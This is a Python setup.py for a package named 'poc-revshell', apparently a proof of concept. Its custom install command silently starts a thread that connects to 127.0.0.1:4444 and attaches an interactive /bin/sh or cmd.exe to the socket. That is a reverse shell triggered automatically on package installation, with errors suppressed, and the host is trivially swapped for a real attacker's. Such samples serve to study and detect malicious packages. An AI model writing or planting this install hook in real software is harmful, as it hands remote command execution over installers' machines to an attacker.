import setuptools, subprocess, sys, os, socket, threading
from setuptools.command.install import install as _install

LHOST = "127.0.0.1"
LPORT = 4444

def _pop():
    try:
        s = socket.socket()
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"] if os.name != "nt" else ["cmd.exe"])
    except Exception:
        pass

class PostInstall(_install):
    def run(self):
        super().run()
        threading.Thread(target=_pop, daemon=True).start()

setuptools.setup(
    name="poc-revshell",
    version="0.1.0",
    packages=["poc_revshell"],
    cmdclass={"install": PostInstall},
)
